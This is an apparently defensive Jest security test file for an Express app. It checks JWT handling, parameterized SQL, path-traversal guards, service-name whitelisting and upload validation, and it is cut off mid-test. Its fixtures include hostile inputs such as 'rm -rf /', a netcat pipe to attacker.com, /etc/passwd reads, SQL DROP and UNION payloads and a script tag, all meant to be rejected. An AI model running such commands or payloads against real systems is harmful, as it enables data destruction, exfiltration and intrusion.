/**
 * Security Tests
 *
 * Tests for security aspects of the application:
 * - JWT Authentication & Token Validation
 * - SQL Injection Prevention
 * - Command Injection Prevention
 * - Path Traversal Prevention
 * - XSS Prevention
 * - Rate Limiting
 * - Input Validation
 * - CORS and Headers
 */

const request = require('supertest');
const express = require('express');
const jwt = require('jsonwebtoken');
const path = require('path');
const os = require('os');
const fs = require('fs');

// Mock database
jest.mock('../../src/database', () => {
  const mockPool = {
    query: jest.fn(),
    connect: jest.fn()
  };
  return {
    pool: mockPool,
    query: mockPool.query,
    getClient: jest.fn().mockResolvedValue({
      query: jest.fn(),
      release: jest.fn()
    })
  };
});

// Die Route `/apps/<id>/…` ist echt; nur die Fragen nach Sitzung, Freigabe und
// Stand der App (Datenbank) sind ersetzt. Der Pfad zur Datei läuft ungemockt.
jest.mock('../../src/middleware/auth', () => ({
  ...jest.requireActual('../../src/middleware/auth'),
  optionalAuth: (req, res, next) => {
    req.user = { id: '1', username: 'admin', role: 'admin' };
    next();
  },
}));
jest.mock('../../src/services/app/appZugang', () => ({
  ...jest.requireActual('../../src/services/app/appZugang'),
  pruefe: jest.fn(),
}));
jest.mock('../../src/services/app/appStore', () => ({
  ...jest.requireActual('../../src/services/app/appStore'),
  ausliefernAus: jest.fn(),
}));

const db = require('../../src/database');
const appZugang = require('../../src/services/app/appZugang');
const appStore = require('../../src/services/app/appStore');
const { ValidationError } = require('../../src/utils/errors');
const {
  resolveWithinRoots,
  resolveRealWithinRoots,
} = require('../../src/services/flows/pathSafe');
const { DateienLesenTool } = require('../../src/services/flows/tools/dateien');

const GEHEIM = 'GEHEIMER-INHALT-AUSSERHALB-DER-WURZEL';

// Test constants
const JWT_SECRET = 'test-secret-key-for-jwt-testing';
const TEST_USER_ID = 1;

// Helper to generate tokens
const generateToken = (payload, options = {}) => {
  return jwt.sign(
    { id: TEST_USER_ID, username: 'testuser', ...payload },
    JWT_SECRET,
    { expiresIn: '24h', issuer: 'arasul-platform', audience: 'arasul-dashboard', ...options }
  );
};

// Create test app with security measures
const createSecureApp = () => {
  const app = express();
  app.use(express.json({ limit: '10mb' }));

  // Security headers middleware
  app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Content-Security-Policy', "default-src 'self'");
    next();
  });

  // Auth middleware
  const authMiddleware = (req, res, next) => {
    const token = req.headers.authorization?.replace('Bearer ', '');
    if (!token) {
      return res
        .status(401)
        .json({ error: { code: 'UNAUTHORIZED', message: 'No token provided' } });
    }
    try {
      const decoded = jwt.verify(token, JWT_SECRET);
      if (decoded.disabled) {
        return res
          .status(403)
          .json({ error: { code: 'FORBIDDEN', message: 'Account disabled' } });
      }
      req.user = decoded;
      next();
    } catch (error) {
      if (error.name === 'TokenExpiredError') {
        return res
          .status(401)
          .json({ error: { code: 'TOKEN_EXPIRED', message: 'Token expired' } });
      }
      return res
        .status(401)
        .json({ error: { code: 'INVALID_TOKEN', message: 'Invalid token' } });
    }
  };

  // Input sanitization helper
  const sanitizeFilename = (filename) => {
    // Remove path separators and null bytes
    return filename
      .replace(/[/\\]/g, '')
      .replace(/\0/g, '')
      .replace(/\.\./g, '')
      .trim();
  };

  // Protected route with parameterized query
  app.get('/api/users/:id', authMiddleware, async (req, res, next) => {
    try {
      const userId = parseInt(req.params.id, 10);
      if (isNaN(userId) || userId < 1 || String(userId) !== req.params.id) {
        return res
          .status(400)
          .json({ error: { code: 'VALIDATION_ERROR', message: 'Invalid user ID' } });
      }

      const result = await db.query(
        'SELECT id, username FROM users WHERE id = $1',
        [userId]
      );

      if (result.rows.length === 0) {
        return res
        .status(404)
        .json({ error: { code: 'NOT_FOUND', message: 'User not found' } });
      }
      res.json(result.rows[0]);
    } catch (err) {
      next(err);
    }
  });

  // Search endpoint (potential SQL injection target)
  app.get('/api/search', authMiddleware, async (req, res) => {
    const { q } = req.query;
    if (!q || typeof q !== 'string') {
      return res
        .status(400)
        .json({ error: { code: 'VALIDATION_ERROR', message: 'Query required' } });
    }

    // Safe: parameterized query with LIKE
    const result = await db.query(
      'SELECT * FROM documents WHERE filename ILIKE $1 LIMIT 100',
      [`%${q}%`]
    );

    res.json(result.rows);
  });

  // File upload with validation
  app.post('/api/documents/upload', authMiddleware, (req, res) => {
    const { filename, content } = req.body;

    if (!filename || typeof filename !== 'string') {
      return res
        .status(400)
        .json({ error: { code: 'VALIDATION_ERROR', message: 'Filename required' } });
    }

    // Sanitize filename
    const sanitized = sanitizeFilename(filename);
    if (sanitized !== filename) {
      return res
        .status(400)
        .json({ error: { code: 'VALIDATION_ERROR', message: 'Invalid filename characters' } });
    }

    // Check file extension
    const allowedExtensions = ['.pdf', '.docx', '.txt', '.md'];
    const ext = path.extname(filename).toLowerCase();
    if (!allowedExtensions.includes(ext)) {
      return res
        .status(400)
        .json({ error: { code: 'VALIDATION_ERROR', message: 'File type not allowed' } });
    }

    res.status(201).json({ filename: sanitized, status: 'uploaded' });
  });

  // Settings update (potential command injection target)
  app.post('/api/settings/restart-service', authMiddleware, async (req, res) => {
    const { serviceName } = req.body;

    // Whitelist of allowed services
    const allowedServices = ['llm-service', 'embedding-service', 'document-indexer'];

    if (!serviceName || !allowedServices.includes(serviceName)) {
      return res
        .status(400)
        .json({ error: { code: 'VALIDATION_ERROR', message: 'Invalid service name' } });
    }

    // In real implementation, use execFile instead of exec
    // and never interpolate user input into commands
    res.json({ message: `Service ${serviceName} restart initiated` });
  });

  // Content endpoint (potential XSS target)
  app.post('/api/content', authMiddleware, (req, res) => {
    const { html } = req.body;

    // In real implementation, sanitize HTML with DOMPurify
    // For API responses, always use JSON and let frontend handle rendering
    res.json({
      content: html,
      sanitized: true // Frontend should still sanitize
    });
  });

  // Rate limited endpoint simulation
  let requestCounts = {};
  app.post('/api/auth/login', (req, res) => {
    const ip = req.ip || 'test-ip';
    requestCounts[ip] = (requestCounts[ip] || 0) + 1;

    if (requestCounts[ip] > 30) {
      return res
        .status(429)
        .json({ error: { code: 'RATE_LIMITED', message: 'Too many requests' } });
    }

    res.json({ message: 'Login processed' });
  });

  // Reset rate limit for testing
  app.post('/api/test/reset-rate-limit', (req, res) => {
    requestCounts = {};
    res.json({ reset: true });
  });

  // Error handler (matches production pattern)
  app.use((err, req, res, next) => {
    res
      .status(500)
      .json({ error: { code: 'INTERNAL_ERROR', message: 'Internal server error' } });
  });

  return app;
};

describe('Security Tests', () => {
  let app;
  let validToken;

  beforeAll(() => {
    app = createSecureApp();
    validToken = generateToken({ disabled: false });
  });

  beforeEach(() => {
    jest.clearAllMocks();
    // Set up default mock return values for db.query
    db.query.mockResolvedValue({ rows: [{ id: 1, username: 'testuser' }] });
  });

  // =====================================================
  // JWT Authentication Security
  // =====================================================
  describe('JWT Authentication Security', () => {
    it('Rejects requests without token', async () => {
      await request(app)
        .get('/api/users/1')
        .expect(401)
        .expect(res => {
          expect(res.body.error.message).toBe('No token provided');
        });
    });

    it('Rejects expired tokens', async () => {
      const expiredToken = jwt.sign(
        { id: TEST_USER_ID, username: 'testuser' },
        JWT_SECRET,
        { expiresIn: '-1h', issuer: 'arasul-platform', audience: 'arasul-dashboard' }
      );

      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401)
        .expect(res => {
          expect(res.body.error.message).toBe('Token expired');
        });
    });

    it('Rejects malformed tokens', async () => {
      await request(app)
        .get('/api/users/1')
        .set('Authorization', 'Bearer invalid.token.here')
        .expect(401)
        .expect(res => {
          expect(res.body.error.message).toBe('Invalid token');
        });
    });

    it('Rejects tokens with wrong signature', async () => {
      const wrongSecretToken = jwt.sign(
        { id: TEST_USER_ID, username: 'testuser' },
        'wrong-secret-key',
        { expiresIn: '24h' }
      );

      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${wrongSecretToken}`)
        .expect(401);
    });

    it('Rejects disabled user accounts', async () => {
      const disabledToken = generateToken({ disabled: true });

      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${disabledToken}`)
        .expect(403)
        .expect(res => {
          expect(res.body.error.message).toBe('Account disabled');
        });
    });

    it('Accepts valid tokens', async () => {
      db.query.mockResolvedValueOnce({
        rows: [{ id: TEST_USER_ID, username: 'testuser' }]
      });

      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);
    });
  });

  // =====================================================
  // SQL Injection Prevention
  // =====================================================
  describe('SQL Injection Prevention', () => {
    it('Prevents SQL injection in user ID parameter', async () => {
      // Attempt SQL injection in URL parameter
      await request(app)
        .get("/api/users/1; DROP TABLE users;--")
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400)
        .expect(res => {
          expect(res.body.error.message).toBe('Invalid user ID');
        });
    });

    it('Prevents SQL injection in search query', async () => {
      db.query.mockResolvedValueOnce({ rows: [] });

      // Attempt SQL injection in query parameter
      const maliciousQuery = "'; DROP TABLE documents; --";

      await request(app)
        .get('/api/search')
        .query({ q: maliciousQuery })
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);

      // Verify parameterized query was used
      expect(db.query).toHaveBeenCalledWith(
        'SELECT * FROM documents WHERE filename ILIKE $1 LIMIT 100',
        [`%${maliciousQuery}%`]
      );
    });

    it('Prevents SQL injection with UNION attacks', async () => {
      db.query.mockResolvedValueOnce({ rows: [] });

      const unionAttack = "' UNION SELECT password_hash FROM users WHERE '1'='1";

      await request(app)
        .get('/api/search')
        .query({ q: unionAttack })
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);

      // Query is parameterized, so attack is treated as literal string
      expect(db.query).toHaveBeenCalled();
    });

    it('Handles numeric ID validation', async () => {
      await request(app)
        .get('/api/users/abc')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400);

      await request(app)
        .get('/api/users/-1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400);
    });
  });

  // =====================================================
  // Path Traversal Prevention
  // =====================================================
  describe('Path Traversal Prevention', () => {
    // Alles hier läuft gegen den Produktionscode: `pathSafe.js` direkt, das
    // Datei-Werkzeug, das ihn benutzt, und die Route `/apps/<id>/…`, die einen
    // Pfad aus der Anfrage auf die Platte abbildet. Keine Nachbildung im Test.
    let wurzel; // erlaubter Ordner
    let aussen; // Nachbar, in den nichts führen darf

    beforeAll(() => {
      const basis = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'pfadpruefung-')));
      wurzel = path.join(basis, 'erlaubt');
      aussen = path.join(basis, 'erlaubt-geheim'); // Präfix-Nachbar: gleicher Anfang
      fs.mkdirSync(path.join(wurzel, 'unter'), { recursive: true });
      fs.mkdirSync(aussen);
      fs.writeFileSync(path.join(wurzel, 'index.html'), '<html>start</html>');
      fs.writeFileSync(path.join(wurzel, 'unter', 'ok.txt'), 'drinnen');
      fs.writeFileSync(path.join(aussen, 'geheim.txt'), GEHEIM);
      fs.symlinkSync(aussen, path.join(wurzel, 'link-ordner'));
      fs.symlinkSync(path.join(aussen, 'geheim.txt'), path.join(wurzel, 'link-datei.txt'));
      fs.symlinkSync(path.join(aussen, 'gibtsnicht'), path.join(wurzel, 'link-baumelnd'));
      fs.symlinkSync(path.join(wurzel, 'unter'), path.join(wurzel, 'link-innen'));
    });

    afterAll(() => {
      fs.rmSync(path.dirname(wurzel), { recursive: true, force: true });
    });

    const loest = (pfad, fn = resolveRealWithinRoots) => fn([wurzel], pfad);

    describe('pathSafe.js', () => {
      it('lässt gewöhnliche Pfade durch', () => {
        expect(loest('unter/ok.txt')).toBe(path.join(wurzel, 'unter', 'ok.txt'));
        expect(loest('')).toBe(wurzel);
        expect(loest('neu/noch-nicht-da.md')).toBe(path.join(wurzel, 'neu', 'noch-nicht-da.md'));
        expect(loest('link-innen/ok.txt')).toBe(path.join(wurzel, 'unter', 'ok.txt'));
      });

      it.each([
        '../erlaubt-geheim/geheim.txt',
        '../../../../../../etc/passwd',
        'unter/../../erlaubt-geheim/geheim.txt',
        '..',
        'unter/../..',
      ])('weist Ausbruch mit ".." ab: %s', pfad => {
        expect(() => loest(pfad)).toThrow(ValidationError);
        expect(() => loest(pfad, resolveWithinRoots)).toThrow(ValidationError);
      });

      it.each([
        '/etc/passwd',
        '/',
        path.join(os.tmpdir(), 'irgendwo'),
        // gleicher Anfang wie die Wurzel, aber ein anderer Ordner
        '__AUSSEN__/geheim.txt',
      ])('weist absolute Pfade ausserhalb ab: %s', pfad => {
        const p = pfad.replace('__AUSSEN__', aussen);
        expect(() => loest(p)).toThrow(ValidationError);
        expect(() => loest(p, resolveWithinRoots)).toThrow(ValidationError);
      });

      it('erlaubt einen absoluten Pfad innerhalb der Wurzel', () => {
        expect(loest(path.join(wurzel, 'unter', 'ok.txt'))).toBe(
          path.join(wurzel, 'unter', 'ok.txt')
        );
      });

      // Doppelpunkt-Folgen: `projekt://` ist der einzige Pfadkopf mit eigener Bedeutung.
      it.each([
        'projekt://aktiv/../../etc/passwd',
        'projekt://aktiv/../erlaubt-geheim/geheim.txt',
        'projekt://aktiv//etc/passwd',
        'projekt://../..',
        'projekt://aktiv/unter/../../..',
        'a:b/../../x.txt', // ohne Kopf ist "a:b" nur ein Ordnername
      ])('weist Ausbruch über den projekt://-Kopf ab: %s', pfad => {
        expect(() => loest(pfad)).toThrow(ValidationError);
        expect(() => loest(pfad, resolveWithinRoots)).toThrow(ValidationError);
      });

      it('nimmt den projekt://-Kopf ab und bleibt in der Wurzel', () => {
        expect(loest('projekt://aktiv/unter/ok.txt')).toBe(path.join(wurzel, 'unter', 'ok.txt'));
        expect(loest('projekt://aktiv')).toBe(wurzel);
      });

      it.each(['projekt:/../x.txt', 'projekt:/aktiv/x.txt', 'a:b/../x.txt', 'C:\\Windows\\x.txt'])(
        'behandelt Doppelpunkt ohne projekt://-Kopf als gewöhnlichen Namen: %s',
        pfad => {
          const ziel = loest(pfad, resolveWithinRoots);
          expect(ziel === wurzel || ziel.startsWith(wurzel + path.sep)).toBe(true);
        }
      );

      // Kodierte Varianten: pathSafe dekodiert nichts. `%2e%2e` ist ein Name,
      // kein `..`. Das muss so bleiben, sonst entschiede jede Schicht davor anders.
      // Ein Name, der mit `..` BEGINNT, wird vorsorglich abgewiesen -- erlaubt ist
      // beides, nie aber ein Ziel ausserhalb.
      it.each(['%2e%2e/%2e%2e/etc/passwd', '..%2f..%2fetc%2fpasswd', '%252e%252e/x', '..%5c..%5cx'])(
        'liest Kodiertes nicht als ".." und kommt nie aus der Wurzel: %s',
        pfad => {
          let ziel = null;
          try {
            ziel = loest(pfad, resolveWithinRoots);
          } catch (err) {
            expect(err).toBeInstanceOf(ValidationError);
          }
          if (ziel) {
            expect(ziel.startsWith(wurzel + path.sep)).toBe(true);
            expect(ziel).toContain('%');
          }
        }
      );

      it('weist ein NUL-Byte ab', () => {
        expect(() => loest('ok.txt\0.png')).toThrow(ValidationError);
        expect(() => loest('unter/\0/../../../etc/passwd')).toThrow(ValidationError);
      });

      it('weist einen Symlink-Ordner und eine Symlink-Datei nach draussen ab', () => {
        expect(() => loest('link-ordner/geheim.txt')).toThrow(ValidationError);
        expect(() => loest('link-ordner')).toThrow(ValidationError);
        expect(() => loest('link-datei.txt')).toThrow(ValidationError);
        expect(() => loest('link-ordner/neu.txt')).toThrow(ValidationError);
      });

      it('weist einen baumelnden Symlink ab (Schreib-Falle)', () => {
        expect(() => loest('link-baumelnd')).toThrow(ValidationError);
      });

      it('weist nach: lexikalisch allein hält einen Symlink NICHT auf', () => {
        // Genau deshalb muss jeder Zugriff durch resolveRealWithinRoots gehen.
        expect(() => loest('link-ordner/geheim.txt', resolveWithinRoots)).not.toThrow();
      });
    });

    describe('Datei-Werkzeug (nutzt pathSafe)', () => {
      const tool = new DateienLesenTool();
      const lies = pfad =>
        tool.execute({ aktion: 'read', pfad: pfad.replace('__AUSSEN__', aussen) }, { roots: [wurzel] });

      it('liest eine Datei in der Wurzel', async () => {
        expect(await lies('unter/ok.txt')).toContain('drinnen');
      });

      it.each([
        '../erlaubt-geheim/geheim.txt',
        '__AUSSEN__/geheim.txt',
        'link-datei.txt',
        'link-ordner/geheim.txt',
        'projekt://aktiv/../erlaubt-geheim/geheim.txt',
        '..%2ferlaubt-geheim%2fgeheim.txt',
      ])('gibt den Inhalt ausserhalb nie heraus: %s', async pfad => {
        const antwort = String(await lies(pfad));
        expect(antwort).not.toContain(GEHEIM);
        expect(antwort).toMatch(/^Fehler:/);
      });
    });

    describe('Route /apps/<id>/… (liefert Dateien aus dem Ordner einer App)', () => {
      let site;

      beforeAll(() => {
        const a = express();
        a.use('/apps', require('../../src/routes/appAusliefern'));
        a.use(require('../../src/middleware/errorHandler').errorHandler);
        site = a;
      });

      beforeEach(() => {
        appZugang.pruefe.mockResolvedValue(undefined);
        appStore.ausliefernAus.mockResolvedValue({ version: '1.0.0', verzeichnis: wurzel });
      });

      const hole = url => request(site).get(url);

      it('liefert eine Datei der App', async () => {
        const res = await hole('/apps/urlaub/unter/ok.txt').expect(200);
        expect(res.text).toBe('drinnen');
      });

      it.each([
        '/apps/urlaub/%2e%2e/erlaubt-geheim/geheim.txt',
        '/apps/urlaub/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '/apps/urlaub/..%2ferlaubt-geheim%2fgeheim.txt',
        '/apps/urlaub/unter/%2e%2e/%2e%2e/erlaubt-geheim/geheim.txt',
        '/apps/urlaub/%252e%252e/erlaubt-geheim/geheim.txt',
        '/apps/urlaub/..%5c..%5cerlaubt-geheim%5cgeheim.txt',
        '/apps/urlaub/%00/../../erlaubt-geheim/geheim.txt',
        '/apps/urlaub/ok.txt%00.png',
        '/apps/urlaub/%2fetc%2fpasswd.txt',
        '/apps/urlaub/test/%2e%2e/%2e%2e/erlaubt-geheim/geheim.txt',
      ])('gibt bei Ausbruchsversuch nichts heraus: %s', async url => {
        const res = await hole(url);
        expect(res.status).toBeGreaterThanOrEqual(400);
        expect(res.status).toBeLessThan(500);
        expect(res.text).not.toContain(GEHEIM);
      });

      it('liefert für einen absoluten Pfad nur die Startseite der App', async () => {
        const res = await hole('/apps/urlaub//etc/passwd').expect(200);
        expect(res.text).toBe('<html>start</html>');
      });

      it('folgt einem Symlink nach draussen nicht', async () => {
        for (const url of [
          '/apps/urlaub/link-datei.txt',
          '/apps/urlaub/link-ordner/geheim.txt',
          '/apps/urlaub/link-baumelnd.txt',
          '/apps/urlaub/link-ordner/neu.txt',
        ]) {
          const res = await hole(url);
          expect(res.text).not.toContain(GEHEIM);
          expect(res.status).toBe(404);
        }
      });

      it('folgt einem Symlink INNERHALB der App weiterhin', async () => {
        const res = await hole('/apps/urlaub/link-innen/ok.txt').expect(200);
        expect(res.text).toBe('drinnen');
      });
    });
  });

  // =====================================================
  // Command Injection Prevention
  // =====================================================
  describe('Command Injection Prevention', () => {
    it('Rejects non-whitelisted service names', async () => {
      await request(app)
        .post('/api/settings/restart-service')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ serviceName: 'llm-service; rm -rf /' })
        .expect(400)
        .expect(res => {
          expect(res.body.error.message).toBe('Invalid service name');
        });
    });

    it('Rejects command chaining attempts', async () => {
      const attacks = [
        'llm-service && cat /etc/passwd',
        'llm-service | nc attacker.com 1234',
        'llm-service $(whoami)',
        'llm-service `id`',
        'llm-service\ncat /etc/passwd'
      ];

      for (const attack of attacks) {
        await request(app)
          .post('/api/settings/restart-service')
          .set('Authorization', `Bearer ${validToken}`)
          .send({ serviceName: attack })
          .expect(400);
      }
    });

    it('Accepts whitelisted service names', async () => {
      const allowedServices = ['llm-service', 'embedding-service', 'document-indexer'];

      for (const service of allowedServices) {
        await request(app)
          .post('/api/settings/restart-service')
          .set('Authorization', `Bearer ${validToken}`)
          .send({ serviceName: service })
          .expect(200);
      }
    });
  });

  // =====================================================
  // File Type Validation
  // =====================================================
  describe('File Type Validation', () => {
    it('Allows valid file extensions', async () => {
      const validFiles = ['doc.pdf', 'doc.docx', 'doc.txt', 'doc.md'];

      for (const filename of validFiles) {
        await request(app)
          .post('/api/documents/upload')
          .set('Authorization', `Bearer ${validToken}`)
          .send({ filename, content: 'data' })
          .expect(201);
      }
    });

    it('Rejects dangerous file extensions', async () => {
      const dangerousFiles = [
        'script.php',
        'shell.sh',
        'exec.exe',
        'macro.xlsm',
        'code.js',
        'page.html'
      ];

      for (const filename of dangerousFiles) {
        await request(app)
          .post('/api/documents/upload')
          .set('Authorization', `Bearer ${validToken}`)
          .send({ filename, content: 'data' })
          .expect(400)
          .expect(res => {
            expect(res.body.error.message).toBe('File type not allowed');
          });
      }
    });

    it('Handles double extensions', async () => {
      const doubleExtensions = [
        'document.pdf.php',
        'file.txt.exe',
        'safe.docx.sh'
      ];

      for (const filename of doubleExtensions) {
        await request(app)
          .post('/api/documents/upload')
          .set('Authorization', `Bearer ${validToken}`)
          .send({ filename, content: 'data' })
          .expect(400);
      }
    });

    it('Handles case variations', async () => {
      // Allowed (case insensitive)
      await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ filename: 'doc.PDF', content: 'data' })
        .expect(201);

      await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ filename: 'doc.TXT', content: 'data' })
        .expect(201);
    });
  });

  // =====================================================
  // Rate Limiting
  // =====================================================
  describe('Rate Limiting', () => {
    beforeEach(async () => {
      // Reset rate limit counter
      await request(app)
        .post('/api/test/reset-rate-limit')
        .send({});
    });

    it('Allows requests within rate limit', async () => {
      for (let i = 0; i < 30; i++) {
        await request(app)
          .post('/api/auth/login')
          .send({ username: 'test', password: 'test' })
          .expect(200);
      }
    });

    it('Blocks requests exceeding rate limit', async () => {
      // Make 31 requests
      for (let i = 0; i < 31; i++) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({ username: 'test', password: 'test' });

        if (i < 30) {
          expect(response.status).toBe(200);
        } else {
          expect(response.status).toBe(429);
          expect(response.body.error.message).toBe('Too many requests');
        }
      }
    });
  });

  // =====================================================
  // Security Headers
  // =====================================================
  describe('Security Headers', () => {
    it('Sets X-Content-Type-Options header', async () => {
      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`);

      expect(response.headers['x-content-type-options']).toBe('nosniff');
    });

    it('Sets X-Frame-Options header', async () => {
      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`);

      expect(response.headers['x-frame-options']).toBe('DENY');
    });

    it('Sets X-XSS-Protection header', async () => {
      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`);

      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
    });

    it('Sets Content-Security-Policy header', async () => {
      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`);

      expect(response.headers['content-security-policy']).toBeDefined();
    });
  });

  // =====================================================
  // Helmet Integration (production app)
  // =====================================================
  describe('Helmet Security Headers (production app)', () => {
    it('helmet is listed as a dependency', () => {
      const pkg = require('../../package.json');
      expect(pkg.dependencies.helmet).toBeDefined();
    });

    it('index.js requires helmet', () => {
      const fs = require('fs');
      const indexSrc = fs.readFileSync(
        require('path').join(__dirname, '../../src/index.js'),
        'utf8'
      );
      expect(indexSrc).toContain("require('helmet')");
      expect(indexSrc).toContain('helmet(');
    });
  });

  // =====================================================
  // Input Validation
  // =====================================================
  describe('Input Validation', () => {
    it('Validates required fields', async () => {
      await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({}) // Missing filename
        .expect(400)
        .expect(res => {
          expect(res.body.error.message).toBe('Filename required');
        });
    });

    it('Validates string type for filename', async () => {
      await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ filename: 12345 })
        .expect(400);
    });

    it('Validates search query parameter', async () => {
      await request(app)
        .get('/api/search')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400)
        .expect(res => {
          expect(res.body.error.message).toBe('Query required');
        });
    });

    it('Handles empty search query', async () => {
      await request(app)
        .get('/api/search')
        .query({ q: '' })
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400);
    });
  });

  // =====================================================
  // XSS Prevention Patterns
  // =====================================================
  describe('XSS Prevention', () => {
    it('JSON responses prevent XSS by default', async () => {
      const xssPayload = '<script>alert("xss")</script>';

      const response = await request(app)
        .post('/api/content')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ html: xssPayload })
        .expect(200);

      // API returns JSON, not HTML - XSS is frontend responsibility
      expect(response.headers['content-type']).toMatch(/json/);
    });

    it('Content-Type header is application/json', async () => {
      db.query.mockResolvedValueOnce({ rows: [] });

      const response = await request(app)
        .get('/api/search')
        .query({ q: 'test' })
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);

      expect(response.headers['content-type']).toMatch(/application\/json/);
    });
  });

  // =====================================================
  // Authentication Edge Cases
  // =====================================================
  describe('Authentication Edge Cases', () => {
    it('Handles token with modified payload', async () => {
      // Create token, then try to modify it
      const parts = validToken.split('.');
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
      payload.id = 9999; // Try to change user ID
      const modifiedPayload = Buffer.from(JSON.stringify(payload)).toString('base64');
      const tamperedToken = `${parts[0]}.${modifiedPayload}.${parts[2]}`;

      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${tamperedToken}`)
        .expect(401);
    });

    it('Handles Bearer prefix variations', async () => {
      db.query.mockResolvedValueOnce({
        rows: [{ id: TEST_USER_ID, username: 'testuser' }]
      });

      // Correct format
      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);
    });

    it('Rejects token in query parameter', async () => {
      await request(app)
        .get(`/api/users/1?token=${validToken}`)
        .expect(401);
    });
  });

  // =====================================================
  // Sensitive Data Exposure Prevention
  // =====================================================
  describe('Sensitive Data Exposure Prevention', () => {
    it('Does not expose password hashes in user queries', async () => {
      db.query.mockResolvedValueOnce({
        rows: [{ id: TEST_USER_ID, username: 'testuser' }]
      });

      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);

      expect(response.body.password_hash).toBeUndefined();
      expect(response.body.password).toBeUndefined();
    });

    it('Query selects only necessary columns', async () => {
      db.query.mockResolvedValueOnce({
        rows: [{ id: TEST_USER_ID, username: 'testuser' }]
      });

      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);

      const queryCall = db.query.mock.calls[0];
      expect(queryCall[0]).toContain('SELECT id, username');
      expect(queryCall[0]).not.toContain('password');
    });
  });

  // =====================================================
  // Error Message Security
  // =====================================================
  describe('Error Message Security', () => {
    it('Does not expose stack traces in production', async () => {
      db.query.mockRejectedValueOnce(new Error('Database error'));

      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(500);

      expect(response.body.stack).toBeUndefined();
    });

    it('Does not expose internal paths', async () => {
      db.query.mockRejectedValueOnce(new Error('Error at /app/src/routes/users.js:42'));

      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(500);

      // Error message should be generic
      expect(JSON.stringify(response.body)).not.toContain('/app/src');
    });
  });
});

describe('Password Policy Security', () => {
  it('requires minimum 8 character passwords', () => {
    const { PASSWORD_REQUIREMENTS } = require('../../src/utils/password');
    expect(PASSWORD_REQUIREMENTS.minLength).toBe(8);
  });

  it('does not require uppercase letters (minimal friction)', () => {
    const { PASSWORD_REQUIREMENTS } = require('../../src/utils/password');
    expect(PASSWORD_REQUIREMENTS.requireUppercase).toBe(false);
  });

  it('does not require lowercase letters (minimal friction)', () => {
    const { PASSWORD_REQUIREMENTS } = require('../../src/utils/password');
    expect(PASSWORD_REQUIREMENTS.requireLowercase).toBe(false);
  });

  it('requires numbers for security', () => {
    const { PASSWORD_REQUIREMENTS } = require('../../src/utils/password');
    expect(PASSWORD_REQUIREMENTS.requireNumbers).toBe(true);
  });
});

describe('JWT Expiry Security', () => {
  it('default expiry is 4h or shorter', () => {
    // Read jwt.js source to verify default
    const fs = require('fs');
    const jwtSrc = fs.readFileSync(
      require('path').join(__dirname, '../../src/utils/jwt.js'),
      'utf8'
    );
    // Match the default value in the source
    const match = jwtSrc.match(/JWT_EXPIRY\s*=\s*process\.env\.JWT_EXPIRY\s*\|\|\s*'(\d+)h'/);
    expect(match).toBeTruthy();
    const hours = parseInt(match[1]);
    expect(hours).toBeLessThanOrEqual(4);
  });
});

describe('exec() Elimination', () => {
  const fs = require('fs');
  const pathModule = require('path');

  // `src/tools/` ist am 23.08.2026 entfallen: die Registry wurde in den
  // System-Prompt geschrieben, aber von keiner Stelle ausgefuehrt.
  const filesToCheck = ['src/services/llm/modelService.js'];

  for (const file of filesToCheck) {
    it(`${file} does not use exec() (uses execFile instead)`, () => {
      const content = fs.readFileSync(
        pathModule.join(__dirname, '../../', file),
        'utf8'
      );
      // Should not have { exec } import (but { execFile } is fine)
      expect(content).not.toMatch(/\{\s*exec\s*\}/);
      expect(content).toContain('execFile');
    });
  }
});

describe('Additional Security Vectors', () => {
  let app;
  let validToken;

  beforeAll(() => {
    app = createSecureApp();
    validToken = generateToken({ disabled: false });
  });

  beforeEach(() => {
    jest.clearAllMocks();
    // Set up default mock return values for db.query
    db.query.mockResolvedValue({ rows: [{ id: 1, username: 'testuser' }] });
  });

  describe('JSON Injection', () => {
    it('Handles deeply nested JSON', async () => {
      // Create deeply nested object
      let nested = { value: 'test' };
      for (let i = 0; i < 100; i++) {
        nested = { nested };
      }

      const response = await request(app)
        .post('/api/content')
        .set('Authorization', `Bearer ${validToken}`)
